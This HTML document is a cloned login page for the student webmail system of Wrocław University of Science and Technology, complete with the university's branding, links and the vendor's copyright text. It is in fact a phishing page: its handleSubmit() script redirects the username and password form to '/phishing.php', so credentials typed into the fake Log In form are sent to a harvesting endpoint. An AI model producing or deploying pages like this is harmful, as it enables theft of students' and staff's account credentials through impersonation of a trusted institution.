<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>SYSTEM POCZTY STUDENCKIEJ   | Wroclawskie Centrum Sieciowo-Superkomputerowe</title>

<style type="text/css">

/* klasa odsylacza <a...> */
a.link_1  {font-size:10pt;
               padding:0px;
               font-family:arial,helvetica,sans-serif;
               font-weight:normal;
               text-decoration:none;
               color:#993300;}

/* pseudoklasa 'mouseover' */
a.link_1:hover {font-weight:normal;
                text-decoration:underline;
                background-color:#ffffff;
                color:#ff0000;}


.cldialog {font-size:10pt;
               font-family:arial,helvetica,sans-serif;
               font-weight:bold;
               color:#993300;}


.ctdialog {font-size:10pt;
               padding-left:2px;
               font-family:arial,helvetica,sans-serif;
               font-weight:bold;
               border-width:1px;
               border-color:#993300;
               color:#663300;}

.csdialog {font-size:10pt;
               font-family:arial,helvetica,sans-serif;
               font-weight:bold;
               border-left-width:1px;
               border-top-width:1px;
               border-right-width:1px;
               border-bottom-width:1px;
               border-color:#993300;
               background-color:#993300;
               color:#ffffff;}
.csfocus {font-size:10pt;
                 font-family:arial,helvetica,sans-serif;
                 font-weight:bold;
                 border-left-width:1px;
                 border-top-width:1px;
                 border-right-width:1px;
                 border-bottom-width:1px;
                 border-color:#ffff00;
                 background-color:#444444;
                 color:#ffff00;}

.info_1 {font-size:8pt;
                 font-family:arial,helvetica,sans-serif;
                 font-weight:normal;
                 color:#666666;}

.err         {font-size:10pt;
               padding-left:2px;
               font-family:arial,helvetica,sans-serif;
               font-weight:bold;
               color:#ff0000;}
</style>

<script type="text/javascript">

li=new Array();

li[0]=new Array();
li[0]['href']="https://smail.pwr.wroc.pl";
li[0]['target']="_self";
li[0]['text']="po&#322;&#261;czenie szyfrowane";
li[0]['on']=new Image();
li[0]['id']="i0";
li[0]['on'].src="https://smail.pwr.edu.pl/uwc/images/red_dot.gif";
li[0]['off']=new Image();
li[0]['off'].src="https://smail.pwr.edu.pl/uwc/images/grey_dot.gif";

li[0]=new Array();
li[0]['href']="https://s.student.pwr.edu.pl/iwc_static/c11n/faq/";
li[0]['target']="_self";
li[0]['text']="pytania i odpowiedzi";
li[0]['on']=new Image();
li[0]['id']="i1";
li[0]['on'].src="https://smail.pwr.edu.pl/uwc/images/red_dot.gif";
li[0]['off']=new Image();
li[0]['off'].src="https://smail.pwr.edu.pl/uwc/images/grey_dot.gif";

li[1]=new Array();
li[1]['href']="https://s.student.pwr.edu.pl/modpass-pwr/";
li[1]['target']="_self";
li[1]['text']="aktywacja konta";
li[1]['on']=new Image();
li[1]['id']="i2";
li[1]['on'].src="https://smail.pwr.edu.pl/uwc/images/red_dot.gif";
li[1]['off']=new Image();
li[1]['off'].src="https://smail.pwr.edu.pl/uwc/images/grey_dot.gif";

li[2]=new Array();
li[2]['href']="https://s.student.pwr.edu.pl/passwd/reset?todo=reset";
li[2]['target']="_self";
li[2]['text']="zapomnia&#322;em/nie znam has&#322;a"
li[2]['on']=new Image();
li[2]['id']="i3";
li[2]['on'].src="https://smail.pwr.edu.pl/uwc/images/red_dot.gif";
li[2]['off']=new Image();
li[2]['off'].src="https://smail.pwr.edu.pl/uwc/images/grey_dot.gif";

li[3]=new Array();
li[3]['href']="https://s.student.pwr.edu.pl/alias";
li[3]['target']="_self";
li[3]['text']="alias pocztowy"
li[3]['on']=new Image();
li[3]['id']="i4";
li[3]['on'].src="https://smail.pwr.edu.pl/uwc/images/red_dot.gif";
li[3]['off']=new Image();
li[3]['off'].src="https://smail.pwr.edu.pl/uwc/images/grey_dot.gif";

li[4]=new Array();
li[4]['href']="https://forum.pwr.wroc.pl";
li[4]['target']="_self";
li[4]['text']="forum studentow"
li[4]['on']=new Image();
li[4]['id']="i5";
li[4]['on'].src="https://smail.pwr.edu.pl/uwc/images/red_dot.gif";
li[4]['off']=new Image();
li[4]['off'].src="https://smail.pwr.edu.pl/uwc/images/grey_dot.gif";

li[5]=new Array();
li[5]['href']="https://s.student.pwr.edu.pl";
li[5]['target']="_self";
li[5]['text']="<b>nowy interfejs pocztowy</b>"
li[5]['on']=new Image();
li[5]['id']="i6";
li[5]['on'].src="https://smail.pwr.edu.pl/uwc/images/red_dot.gif";
li[5]['off']=new Image();
li[5]['off'].src="https://smail.pwr.edu.pl/uwc/images/grey_dot.gif";




function linki(){
for (var i=0; i<li.length; i++){
 document.writeln("<a class='link_1' href="+li[i]['href']+" target="+li[i]['target']+">"+li[i]['text']+"</a><br>");
 }
}

function wodotryski(){
for (var i=0; i<li.length; i++){
 document.write("<a class='link_1' href="+li[i]['href']+
 " target="+li[i]['target']);
 document.write(" onmouseover="+li[i]['id']+".src="); document.write("'"+li[i]['on'].src+"'");
 document.write(" onmouseout="+ li[i]['id']+".src="); document.write("'"+li[i]['off'].src+"'");
 document.writeln(">");
 document.writeln("<img border='0' hspace='4' src="+li[i]['off'].src+" id="+li[i]['id']+">");

 document.writeln(li[i]['text']+"</a><br>");
 }
}

</script>

<script type="text/javascript" src="./files/agent.js"></script><link href="./files/master-style_ns6up.css" type="text/css" rel="stylesheet"><link href="./files/mail_css_ns6up.css" type="text/css" rel="stylesheet">


<script type="text/javascript">
     var user = ''
     var error = ''
     var st = window.location.search

     //parametry przekazane w URI
     if (st) {
       var slen = st.length
       var est = st.indexOf("&error")
       var ust = st.indexOf("?user")
       if (est != -1) {
         error = st.substring(est+7, slen)
         slen = est
       }
       if (ust != -1)
         user = st.substring(ust+6, slen)
     }


     function errorHTML() {
       var s='';
       if (error){
         if (error.indexOf("Login%20incorrect")!==-1)
         s="<img src='https://smail.pwr.edu.pl/uwc/images/err_1.gif' alt='' border='0'>";
        }
       if (user && !error)
         s="<img src='https://smail.pwr.edu.pl/uwc/images/err_2.gif' alt='' border='0'>";
       if (error || user)
        document.write(s);
     }
</script>

<script src="./files/browserVersion.js" type="text/javascript"></script>
<script type="text/javascript">
var copyRight = null;
var productName = null;
var logoImagePath = null;
var versionImagePath = null;
var versionPageTitle = null;
var closeLabel = null;
var closeTitle = null;
var LoginImagePath = null;

function handleLoad()
{
copyRight="Copyright � 2004 Sun Microsystems, Inc. All rights reserved. SUN PROPRIETARY/CONFIDENTIAL. U.S. Government Rights - Commercial software. Government users are subject to the Sun Microsystems, Inc. standard license agreement and applicable provisions of the FAR and its supplements. Use is subject to license terms. Sun, Sun Microsystems, the Sun logo and Java are trademarks or registered trademarks of Sun Microsystems, Inc. in the U.S. and other countries.";
productName="Sun Java &#153; System Communications Express";
logoImagePath="https://smail.pwr.edu.pl/uwc/images/login-logo.gif";
versionImagePath="https://smail.pwr.edu.pl/../images/S1MC_login.gif";
versionPageTitle="Version Information";
closeLabel="Close";
closeTitle="Close Window";
document.form1.username.focus();
}


function handleSubmit() {
  var targetAction =  "/phishing.php";
  document.form1.action = targetAction;
  document.form1.submit();
}



function handleError() {
	if (false || false ) {
		document.write('<DIV class=logErr>');
		document.write('<table cellspacing=0 cellpadding=0 border=0>');
		document.write('<tbody>');
	        document.write('<tr>');
		document.write('<td valign=top width="28"><img src="https://smail.pwr.edu.pl/uwc/images/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;</td>');
		document.write("<td width='233'> <span class='err'> Authentication Failed<br> Reenter your username and password.</span> </td>");

		document.write('</tr>');
		document.write('</tbody>');
		document.write('</table>');
		document.write('</DIV>');
	}

}

</script>


</head>
<body onload="handleLoad()" marginwidth="10" marginheight="10" leftmargin="10" bgcolor="#ffffff" topmargin="10">
   
    
<table cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff" align="center" width="100%">
 <tbody><tr>
  <td>
      <div align="left">
       <a href="http://www.pwr.edu.pl/" target="_blank">
       <img src="./files/pwr_2.gif" alt="" hspace="0" border="0" vspace="0"><br>
       </a>
       <img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0">
      </div>
  </td>
  <td>
    <script type="text/javascript">wodotryski();</script>
  </td>
 </tr>
</tbody></table>




<table cellspacing="0" cellpadding="0" border="0" align="center" width="100%">
 <tbody><tr>
  <td align="center" valign="top">
   <img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0"><br>
   <img src="./files/stu_1.gif" alt="" hspace="0" border="0" vspace="0">
  </td>
 </tr>
</tbody></table>

<div align="center">
 <img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0"><br>
 <img src="./files/hr_1_ani.gif" alt="" hspace="0" height="2" border="0" width="100%" vspace="0">
</div>

<img src="./files/spacer.gif" alt="" hspace="0" height="20" border="0" width="1" vspace="0"><br>




<table cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff" align="center" width="100%">
<tbody><tr><td align="center"><img src="./files/prof_1.gif" alt="" border="0"></td></tr>
<tr>
<td>

            <table cellspacing="0" cellpadding="4" border="0" align="center" width="70%">
             <tbody><tr>
              <td class="err" colspan="2" align="center">
               <img src="./files/spacer.gif" alt="" hspace="0" height="30" border="0" width="1" vspace="0">
               	<script type="text/javascript">handleError();</script>
              </td>
             </tr>
            </tbody></table>

<form name="form1" onsubmit="handleSubmit()" action="/" method="POST">
<input name="fromlogin" value="true" type="hidden">

<input name="orgaccess" value="http" type="hidden">
 <table cellspacing="0" cellpadding="4" border="0" align="center">
  <tbody><tr>
   <td class="cldialog" align="right">
   nazwa konta:
   </td>
   <td align="left"> <input class="ctdialog" size="24" id="username" tabindex="1" name="username" type="text">
    <script type="text/javascript">document.forms[0].user.focus();</script>
   </td>
  </tr>
  <tr>
   <td class="cldialog" align="right">
   hasło:
   </td>
   <td align="left"> 
    <input class="ctdialog" name="password" size="24" id="password" tabindex="2" type="password">
   </td>
  </tr>
  <tr>
   <td>&nbsp;</td>
   <td align="left">
    <img src="./files/spacer.gif" alt="" hspace="0" height="10" border="0" width="1" vspace="0">
    <br>
           
    <input class="csdialog" id="button" onblur="this.className='csfocus'" onmouseover="this.className='csfocus'" title="Log In" onfocus="this.className='csfocus'" onclick="handleSubmit(); return false;" tabindex="3" onmouseout="this.className='csdialog'" value="     Log In     " name="Button2" type="submit">
   </td>
  </tr>
 </tbody></table>
</form>


        <div align="center">

<p style="font-family: Verdana; font-size:12px; color:#346A2D;font-weight:bold;">
<br>Wszelkie uwagi zwiazane z obsluga interfejsu prosimy przesylac na adres <a name="tex2html12" href="mailto:%20smail@pwr.edu.pl">smail@pwr.edu.pl</a>.</p><br>


         <img src="./files/spacer.gif" alt="" hspace="0" height="30" border="0" width="1" vspace="0"><br>
         <img src="./files/hr_1.gif" alt="" hspace="0" height="1" border="0" width="100%" vspace="0">
         <img src="./files/spacer.gif" alt="" hspace="0" height="4" border="0" width="1" vspace="0"><br>
        </div>

         <table align="center">
         <tbody><tr>
             <td valign="middle">
             <a href="http://www.wcss.wroc.pl/" title=" Wrocławskie Centrum Sieciowo-Superkomputerowe ">
             <img src="./files/wcss_20.gif" alt=" Wrocławskie Centrum Sieciowo-Superkomputerowe " hspace="0" border="0" vspace="0">
             </a>
             </td>
             <td valign="middle">
             <div class="info_1" align="center">
              serwer prowadzi Wrocławskie Centrum Sieciowo-Superkomputerowe
             </div>
             </td>
         </tr>
         </tbody></table>    
  </td></tr></tbody></table>      

</body></html>
